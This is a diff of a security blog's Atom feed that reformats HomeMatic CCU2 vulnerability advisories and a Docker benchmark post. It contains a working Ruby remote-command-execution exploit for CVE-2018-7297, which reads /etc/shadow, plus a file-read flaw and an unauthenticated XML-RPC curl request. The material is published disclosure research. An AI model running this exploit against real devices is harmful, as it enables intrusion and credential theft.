 system.Exec(&quot;cat /etc/shadow&quot;, &amp;amp;stdout, &amp;amp;stderr);
 WriteLine(stdout);
-&lt;/code&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h1 id=&quot;proof-of-concept&quot;&gt;Proof-of-Concept&lt;/h1&gt;
 
-&lt;pre&gt;&lt;code class=&quot;language-ruby&quot;&gt;#!/usr/bin/ruby
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;
 
-# Exploit Title: Homematic CCU2 Remote Command Execution
-# Date: 28-03-18
-# Exploit Author: Patrick Muench (SVA System Vertrieb Alexander GmbH), Gregor Kopf (Secfault Security GmbH)
-# Vendor Homepage: http://www.eq-3.de
-# Software Link: http://www.eq-3.de/service/downloads.html?id=268
-# Version: 2.29.23
-# CVE : 2018-7297
+&lt;span class=&quot;c1&quot;&gt;# Exploit Title: Homematic CCU2 Remote Command Execution&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Date: 28-03-18&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Exploit Author: Patrick Muench (SVA System Vertrieb Alexander GmbH), Gregor Kopf (Secfault Security GmbH)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Vendor Homepage: http://www.eq-3.de&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Software Link: http://www.eq-3.de/service/downloads.html?id=268&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Version: 2.29.23&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# CVE : 2018-7297&lt;/span&gt;
 
-# Description: http://atomic111.github.io/article/homematic-ccu2-remote-code-execution
+&lt;span class=&quot;c1&quot;&gt;# Description: http://atomic111.github.io/article/homematic-ccu2-remote-code-execution&lt;/span&gt;
 
-require &#39;net/http&#39;
-require &#39;net/https&#39;
-require &#39;uri&#39;
+&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'net/http'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'net/https'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'uri'&lt;/span&gt;
 
-unless ARGV.length == 2
-  STDOUT.puts &amp;lt;&amp;lt;-EOF
+&lt;span class=&quot;k&quot;&gt;unless&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ARGV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
+  &lt;span class=&quot;no&quot;&gt;STDOUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;
 Please provide url and the command, which is execute on the homematic
 
 Usage:
@@ -318,38 +653,38 @@ Example:
 
   execute_cmd.rb http://192.168.1.1 &quot;cat /etc/shadow&quot;
 
-EOF
-  exit
-end
+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
 
-# The first argument specifies the URL and if http or https is used
-url = ARGV[0] + &quot;/Test.exe&quot;
+&lt;span class=&quot;c1&quot;&gt;# The first argument specifies the URL and if http or https is used&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ARGV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/Test.exe&quot;&lt;/span&gt;
 
-# The second argument specifies the command which is executed via tcl interpreter
-tcl_command = ARGV[1]
+&lt;span class=&quot;c1&quot;&gt;# The second argument specifies the command which is executed via tcl interpreter&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tcl_command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ARGV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 
-# define body content
-body = &quot;string stdout;string stderr;system.Exec(\&quot;&quot; &amp;lt;&amp;lt; tcl_command &amp;lt;&amp;lt; &quot;\&quot;, &amp;amp;stdout, &amp;amp;stderr);WriteLine(stdout);&quot;
+&lt;span class=&quot;c1&quot;&gt;# define body content&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;string stdout;string stderr;system.Exec(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcl_command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;, &amp;amp;stdout, &amp;amp;stderr);WriteLine(stdout);&quot;&lt;/span&gt;
 
-# split uri to access it in a easier way
-uri = URI.parse(url)
+&lt;span class=&quot;c1&quot;&gt;# split uri to access it in a easier way&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-# define target connection, disabling certificate verification
-Net::HTTP.start(uri.host, uri.port, :use_ssl =&amp;gt; uri.scheme == &#39;https&#39;, :verify_mode =&amp;gt; OpenSSL::SSL::VERIFY_NONE) do |http|
+&lt;span class=&quot;c1&quot;&gt;# define target connection, disabling certificate verification&lt;/span&gt;
+&lt;span class=&quot;no&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:use_ssl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;scheme&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'https'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:verify_mode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;OpenSSL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;SSL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;VERIFY_NONE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
 
-  # define post request
-  request = Net::HTTP::Post.new(uri.request_uri)
+  &lt;span class=&quot;c1&quot;&gt;# define post request&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;request_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-  # define the request body
-  request.body = body
+  &lt;span class=&quot;c1&quot;&gt;# define the request body&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;
 
-  # send the request to the homematic ccu2
-  response = http.request(request)
+  &lt;span class=&quot;c1&quot;&gt;# send the request to the homematic ccu2&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-  # print response to cli
-  puts response.body
-end
-&lt;/code&gt;&lt;/pre&gt;
+  &lt;span class=&quot;c1&quot;&gt;# print response to cli&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;body&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h1 id=&quot;cve&quot;&gt;CVE&lt;/h1&gt;
 
@@ -377,9 +712,9 @@ end
  
  <entry>
    <title>CVE-2018-7296: Directory Traversal / Arbitrary File Read in HomeMatic CCU2</title>
-   <link href="http://atomic111.github.io/article/homematic-ccu2-fileread"/>
-   <updated>2018-02-21T15:26:00+00:00</updated>
-   <id>http://atomic111.github.io/article/homematic-ccu2-fileread</id>
+   <link href="http://localhost:4000/article/homematic-ccu2-fileread"/>
+   <updated>2018-02-21T16:26:00+01:00</updated>
+   <id>http://localhost:4000/article/homematic-ccu2-fileread</id>
    <content type="html">&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
 
 &lt;p&gt;HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU2 is a central control unit, which is responsible for integrating these components with each other.&lt;/p&gt;
@@ -395,21 +730,20 @@ with access to the web interface.&lt;/p&gt;
 
 &lt;p&gt;The system provides a JSON API, which exposes various methods. While some methods require the connecting user to be authenticated, a number of methods can also be used anonymously.&lt;/p&gt;
 
-&lt;p&gt;A code review of the file &lt;code&gt;api/methods/user/getlanguage.tcl&lt;/code&gt; revealed that the User.getLanguage method allows unauthenticated attackers to read the first line of an arbitrary file on the CCU2’s filesystem.&lt;/p&gt;
+&lt;p&gt;A code review of the file &lt;code class=&quot;highlighter-rouge&quot;&gt;api/methods/user/getlanguage.tcl&lt;/code&gt; revealed that the User.getLanguage method allows unauthenticated attackers to read the first line of an arbitrary file on the CCU2’s filesystem.&lt;/p&gt;
 
-&lt;p&gt;Please consider the following excerpt from the file &lt;code&gt;api/methods/user/getlanguage.tcl&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;Please consider the following excerpt from the file &lt;code class=&quot;highlighter-rouge&quot;&gt;api/methods/user/getlanguage.tcl&lt;/code&gt;:&lt;/p&gt;
 
-&lt;p&gt;```
-if {[catch {set fp [open “/etc/config/userprofiles/$args(userName).lang” r]}] == 0} {
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if {[catch {set fp [open &quot;/etc/config/userprofiles/$args(userName).lang&quot; r]}] == 0} {
   set data [read $fp]
-  set lang [split $data “\n”]
+  set lang [split $data &quot;\n&quot;]
   close $fp
 } else {
-  set lang “0”
-}&lt;/p&gt;
+  set lang &quot;0&quot;
+}
 
-&lt;p&gt;jsonrpc_response [lindex $lang 0]
-```&lt;/p&gt;
+jsonrpc_response [lindex $lang 0]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Please note that the web server is running as root, which means that this vulnerability can be exploited in order to disclose the first line of any file on the target’s filesystem.&lt;/p&gt;
 
@@ -441,9 +775,9 @@ if {[catch {set fp [open “/etc/config/userprofiles/$args(userName).lang” r]}
  
  <entry>
    <title>CVE-2018-7301: Unauthenticated XML-RPC Service in HomeMatic CCU2</title>
-   <link href="http://atomic111.github.io/article/homematic-ccu2-xml-rpc"/>
-   <updated>2018-02-21T13:00:00+00:00</updated>
-   <id>http://atomic111.github.io/article/homematic-ccu2-xml-rpc</id>
+   <link href="http://localhost:4000/article/homematic-ccu2-xml-rpc"/>
+   <updated>2018-02-21T14:00:00+01:00</updated>
+   <id>http://localhost:4000/article/homematic-ccu2-xml-rpc</id>
    <content type="html">&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
 
 &lt;p&gt;HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU2 is a central control unit, which is responsible for integrating these components with each other.&lt;/p&gt;
@@ -458,17 +792,14 @@ if {[catch {set fp [open “/etc/config/userprofiles/$args(userName).lang” r]}
 
 &lt;p&gt;The following request illustrates the problem:&lt;/p&gt;
 
-&lt;p&gt;```
-curl -v -H “Content-Type:text/xml” -d “&lt;?xml version=&quot;1.0&quot;?&gt;&lt;methodcall&gt;&lt;/methodcall&gt;&lt;/p&gt;
-&lt;methodname&gt;system.listMethods&lt;/methodname&gt;
-&lt;params /&gt;
-&lt;p&gt;&amp;lt;/methodCall&amp;gt;”
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -v -H &quot;Content-Type:text/xml&quot; -d &quot;&amp;lt;?xml version=&quot;1.0&quot;?&amp;gt;&amp;lt;methodCall&amp;gt;
+&amp;lt;methodName&amp;gt;system.listMethods&amp;lt;/methodName&amp;gt;&amp;lt;params/&amp;gt;&amp;lt;/methodCall&amp;gt;&quot;
 http://192.168.2.145:2001
-```&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;The following response shows that the system successfully processed the unauthenticated request:&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt;HTTP/1.1 200 OK
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
 Server: XMLRPC++ 0.7
 Content-Type: text/xml
 Content-length: 1736
@@ -541,7 +872,7 @@ Content-length: 1736
     &amp;lt;/param&amp;gt;
   &amp;lt;/params&amp;gt;
 &amp;lt;/methodResponse&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h1 id=&quot;cve&quot;&gt;CVE&lt;/h1&gt;
 
@@ -569,9 +900,9 @@ Content-length: 1736
  
  <entry>
    <title>Docker Security Tool: InSpec CIS Docker Benchmark</title>
-   <link href="http://atomic111.github.io/article/inspec-cis-docker"/>
-   <updated>2016-05-30T10:00:00+00:00</updated>
-   <id>http://atomic111.github.io/article/inspec-cis-docker</id>
+   <link href="http://localhost:4000/article/inspec-cis-docker"/>
+   <updated>2016-05-30T12:00:00+02:00</updated>
+   <id>http://localhost:4000/article/inspec-cis-docker</id>
    <content type="html">&lt;p&gt;We have recently published the new &lt;a href=&quot;https://github.com/dev-sec/cis-docker-benchmark&quot;&gt;InSpec CIS Docker Benchmark profile&lt;/a&gt;. This &lt;a href=&quot;https://github.com/chef/inspec&quot;&gt;InSpec&lt;/a&gt; compliance profile implements the &lt;a href=&quot;https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.11.0_Benchmark_v1.0.0.pdf&quot;&gt;CIS Docker 1.11.0 Benchmark&lt;/a&gt; in an automated way to provide security best-practice tests around the Docker daemon and containers in a production environment.&lt;/p&gt;
 
 &lt;p&gt;Having the CIS document is very important, but to have the ability to execute the benchmarks and to get immediately a status of your running environment is equally important. To achive the goal we have implemented the CIS Docker Benchmarks for Security, which automates inpsecting a host configuration against the CIS Benchmark recommendations. We also started to include some attributes, that you can configure tests to meet your production environment.&lt;/p&gt;
@@ -586,92 +917,83 @@ Content-length: 1736
 
 &lt;p&gt;First of all download the github repo:&lt;/p&gt;
 
-&lt;p&gt;&lt;code&gt;
-git clone https://github.com/dev-sec/cis-docker-benchmark.git
-&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/dev-sec/cis-docker-benchmark.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Next you can execute the InSpec profile with&lt;/p&gt;
 
-&lt;p&gt;&lt;code&gt;
-∅&amp;gt; inspec exec cis-docker-benchmark -t ssh://vagrant@127.0.0.1 --port 2222 --key-files vm_docker/.vagrant/machines/centos7/virtualbox/private_key --sudo
-&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;∅&amp;gt; inspec exec cis-docker-benchmark -t ssh://vagrant@127.0.0.1 --port 2222 --key-files vm_docker/.vagrant/machines/centos7/virtualbox/private_key --sudo
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;or you can execute it directly from the github repo like:&lt;/p&gt;
 
-&lt;p&gt;&lt;code&gt;
-∅&amp;gt; inspec exec https://github.com/dev-sec/cis-docker-benchmark.git -t ssh://vagrant@127.0.0.1 --port 2222 --key-files vm_docker/.vagrant/machines/centos7/virtualbox/private_key --sudo
-&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;∅&amp;gt; inspec exec https://github.com/dev-sec/cis-docker-benchmark.git -t ssh://vagrant@127.0.0.1 --port 2222 --key-files vm_docker/.vagrant/machines/centos7/virtualbox/private_key --sudo
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Result:
-```
-Failures:&lt;/p&gt;
+&lt;p&gt;Result:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Failures:
 
-&lt;p&gt;1) Json /etc/docker/daemon.json [“default-ulimits”, “nproc”] should eq “1024:2408”
-     Failure/Error: DEFAULT_FAILURE_NOTIFIER = lambda { |failure, _opts| raise failure }&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;   expected: &quot;1024:2408&quot;
-        got: nil
-
-   (compared using ==)
- # cis-docker-benchmark/controls/docker_level1.rb:120:in `block (3 levels) in load&#39;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;2) Json /etc/docker/daemon.json [“default-ulimits”, “nofile”] should eq “100:200”
-     Failure/Error: DEFAULT_FAILURE_NOTIFIER = lambda { |failure, _opts| raise failure }&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;   expected: &quot;100:200&quot;
-        got: nil
-
-   (compared using ==)
- # cis-docker-benchmark/controls/docker_level1.rb:123:in `block (3 levels) in load&#39;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;3) {“Id”=&amp;gt;”d959bba770f00a2a58c235002b530418d886b814b3743806c49838442b11106d”, “Created”=&amp;gt;”2016-05-30T07:31:58.879644757Z”, “Path”=&amp;gt;”/bin/bash”, “Args”=&amp;gt;[“-c”, “while true; do echo hello world; sleep 1; done”], “State”=&amp;gt;{“Status”=&amp;gt;”running”, “Running”=&amp;gt;true, “Paused”=&amp;gt;false, “Restarting”=&amp;gt;false, “OOMKilled”=&amp;gt;false, “Dead”=&amp;gt;false, “Pid”=&amp;gt;21019, “ExitCode”=&amp;gt;0, “Error”=&amp;gt;””, “StartedAt”=&amp;gt;”2016-05-30T07:31:59.183990208Z”, “FinishedAt”=&amp;gt;”0001-01-01T00:00:00Z”}, “Image”=&amp;gt;”sha256:26bb67a2a5908b2c9858a69be0160f4610ddfb956b775f975e748ee85736b417”, “ResolvConfPath”=&amp;gt;”/var/lib/docker/containers/d959bba770f00a2a58c235002b530418d886b814b3743806c49838442b11106d/resolv.conf”, “HostnamePath”=&amp;gt;”/var/lib/docker/containers/d959bba770f00a2a58c235002b530418d886b814b3743806c49838442b11106d/hostname”, “HostsPath”=&amp;gt;”/var/lib/docker/containers/d959bba770f00a2a58c235002b530418d886b814b3743806c49838442b11106d/hosts”, “LogPath”=&amp;gt;”/var/lib/docker/containers/d959bba770f00a2a58c235002b530418d886b814b3743806c49838442b11106d/d959bba770f00a2a58c235002b530418d886b814b3743806c49838442b11106d-json.log”, “Name”=&amp;gt;”/ubuntu-test”, “RestartCount”=&amp;gt;0, “Driver”=&amp;gt;”devicemapper”, “MountLabel”=&amp;gt;”system_u:object_r:svirt_sandbox_file_t:s0-s0:c1023”, “ProcessLabel”=&amp;gt;”system_u:system_r:svirt_lxc_net_t:s0-s0:c1023”, “AppArmorProfile”=&amp;gt;””, “ExecIDs”=&amp;gt;nil, “HostConfig”=&amp;gt;{“Binds”=&amp;gt;[“/tmp:/test”], “ContainerIDFile”=&amp;gt;””, “LogConfig”=&amp;gt;{“Type”=&amp;gt;”json-file”, “Config”=&amp;gt;nil}, “NetworkMode”=&amp;gt;”default”, “PortBindings”=&amp;gt;{“23/tcp”=&amp;gt;[{“HostIp”=&amp;gt;”172.17.0.1”, “HostPort”=&amp;gt;”2222”}]}, “RestartPolicy”=&amp;gt;{“Name”=&amp;gt;”on-failure”, “MaximumRetryCount”=&amp;gt;5}, “AutoRemove”=&amp;gt;false, “VolumeDriver”=&amp;gt;””, “VolumesFrom”=&amp;gt;nil, “CapAdd”=&amp;gt;nil, “CapDrop”=&amp;gt;[“all”], “Dns”=&amp;gt;[], “DnsOptions”=&amp;gt;[], “DnsSearch”=&amp;gt;[], “ExtraHosts”=&amp;gt;nil, “GroupAdd”=&amp;gt;nil, “IpcMode”=&amp;gt;””, “Cgroup”=&amp;gt;””, “Links”=&amp;gt;nil, “OomScoreAdj”=&amp;gt;0, “PidMode”=&amp;gt;””, “Privileged”=&amp;gt;false, “PublishAllPorts”=&amp;gt;false, “ReadonlyRootfs”=&amp;gt;true, “SecurityOpt”=&amp;gt;[“label:level:s0-s0:c1023”, “seccomp={&quot;defaultAction&quot;:&quot;SCMP_ACT_ALLOW&quot;,&quot;syscalls&quot;:[{&quot;name&quot;:&quot;mkdir&quot;,&quot;action&quot;:&quot;SCMP_ACT_ERRNO&quot;,&quot;args&quot;:[]},{&quot;name&quot;:&quot;chown&quot;,&quot;action&quot;:&quot;SCMP_ACT_ERRNO&quot;,&quot;args&quot;:[]}]}”], “StorageOpt”=&amp;gt;nil, “UTSMode”=&amp;gt;””, “UsernsMode”=&amp;gt;””, “ShmSize”=&amp;gt;67108864, “ConsoleSize”=&amp;gt;[0, 0], “Isolation”=&amp;gt;””, “CpuShares”=&amp;gt;512, “Memory”=&amp;gt;268435456, “CgroupParent”=&amp;gt;””, “BlkioWeight”=&amp;gt;0, “BlkioWeightDevice”=&amp;gt;nil, “BlkioDeviceReadBps”=&amp;gt;nil, “BlkioDeviceWriteBps”=&amp;gt;nil, “BlkioDeviceReadIOps”=&amp;gt;nil, “BlkioDeviceWriteIOps”=&amp;gt;nil, “CpuPeriod”=&amp;gt;0, “CpuQuota”=&amp;gt;0, “CpusetCpus”=&amp;gt;””, “CpusetMems”=&amp;gt;””, “Devices”=&amp;gt;[], “DiskQuota”=&amp;gt;0, “KernelMemory”=&amp;gt;0, “MemoryReservation”=&amp;gt;0, “MemorySwap”=&amp;gt;536870912, “MemorySwappiness”=&amp;gt;-1, “OomKillDisable”=&amp;gt;false, “PidsLimit”=&amp;gt;0, “Ulimits”=&amp;gt;nil, “CpuCount”=&amp;gt;0, “CpuPercent”=&amp;gt;0, “BlkioIOps”=&amp;gt;0, “BlkioBps”=&amp;gt;0, “SandboxSize”=&amp;gt;0}, “GraphDriver”=&amp;gt;{“Name”=&amp;gt;”devicemapper”, “Data”=&amp;gt;{“DeviceId”=&amp;gt;”61”, “DeviceName”=&amp;gt;”docker-8:17-311297-1b14cce13804c1db6d55a208a92cface12ff89cca4916f01e4199a776019fad8”, “DeviceSize”=&amp;gt;”10737418240”}}, “Mounts”=&amp;gt;[{“Source”=&amp;gt;”/tmp”, “Destination”=&amp;gt;”/test”, “Mode”=&amp;gt;””, “RW”=&amp;gt;true, “Propagation”=&amp;gt;”rprivate”}], “Config”=&amp;gt;{“Hostname”=&amp;gt;”d959bba770f0”, “Domainname”=&amp;gt;””, “User”=&amp;gt;”ubuntu”, “AttachStdin”=&amp;gt;false, “AttachStdout”=&amp;gt;false, “AttachStderr”=&amp;gt;false, “ExposedPorts”=&amp;gt;{“23/tcp”=&amp;gt;{}}, “Tty”=&amp;gt;false, “OpenStdin”=&amp;gt;false, “StdinOnce”=&amp;gt;false, “Env”=&amp;gt;[“PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin”], “Cmd”=&amp;gt;[“/bin/bash”, “-c”, “while true; do echo hello world; sleep 1; done”], “Image”=&amp;gt;”ubuntu-test:latest”, “Volumes”=&amp;gt;nil, “WorkingDir”=&amp;gt;””, “Entrypoint”=&amp;gt;nil, “OnBuild”=&amp;gt;nil, “Labels”=&amp;gt;{}}, “NetworkSettings”=&amp;gt;{“Bridge”=&amp;gt;””, “SandboxID”=&amp;gt;”a5a927291513b5d6a8910463bc7ea7242339a6f20e0cdee29325dc83bdc4cf29”, “HairpinMode”=&amp;gt;false, “LinkLocalIPv6Address”=&amp;gt;””, “LinkLocalIPv6PrefixLen”=&amp;gt;0, “Ports”=&amp;gt;{“23/tcp”=&amp;gt;[{“HostIp”=&amp;gt;”172.17.0.1”, “HostPort”=&amp;gt;”2222”}]}, “SandboxKey”=&amp;gt;”/var/run/docker/netns/a5a927291513”, “SecondaryIPAddresses”=&amp;gt;nil, “SecondaryIPv6Addresses”=&amp;gt;nil, “EndpointID”=&amp;gt;”f1f27a98c24c57e4caba3010259d5c0a4e35ad6c01203136e68cb7563eca1b56”, “Gateway”=&amp;gt;”172.17.0.1”, “GlobalIPv6Address”=&amp;gt;””, “GlobalIPv6PrefixLen”=&amp;gt;0, “IPAddress”=&amp;gt;”172.17.0.2”, “IPPrefixLen”=&amp;gt;16, “IPv6Gateway”=&amp;gt;””, 